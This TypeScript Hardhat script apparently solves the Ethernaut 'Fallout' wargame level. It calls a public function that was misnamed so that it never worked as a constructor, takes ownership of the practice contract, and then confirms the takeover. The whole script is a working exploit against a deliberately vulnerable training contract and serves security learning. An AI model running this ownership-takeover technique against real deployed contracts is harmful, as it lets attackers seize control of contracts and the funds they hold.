import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackFallout = async () => {
    // change contract addresses here.
    const falloutAddress = "0xe3958F5f3E7C470c3F0a9d680C9C0670D9688a66"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here

    // Don't touch below 🚀
    // Vulnerability from mistake of making a function not a constructor. Can call function to become the owner.
    // additional read:
    // https://docs.soliditylang.org/en/v0.8.10/contracts.html
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            name: "Fal1out",
            outputs: [],
            payable: true,
            stateMutability: "payable",
            type: "function",
        },
        {
            inputs: [],
            name: "allocate",
            outputs: [],
            stateMutability: "payable",
            type: "function",
        },
        {
            inputs: [{ internalType: "address", name: "allocator", type: "address" }],
            name: "allocatorBalance",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "collectAllocations",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address payable", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{ internalType: "address payable", name: "allocator", type: "address" }],
            name: "sendAllocation",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, falloutAddress);
    const ownerAddress = await contract.owner();
    console.log(`Contract Owner is: ${ownerAddress}`);
    console.log("Activating function 'Fal1out' to become the new owner...");
    const tx1 = await contract.Fal1out();
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    console.log("Now checking that player is now owner...");
    const newOwner = await contract.owner();
    console.log(`Contract Owner is now: ${newOwner}`);
    const owner = newOwner === player;
    console.log(`Player is now owner: ${owner}`);
    if (owner) {
        console.log("Done...submit in ethernaut");
    } else {
        console.log("Player is not owner, please review code above");
    }
};

attackFallout()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
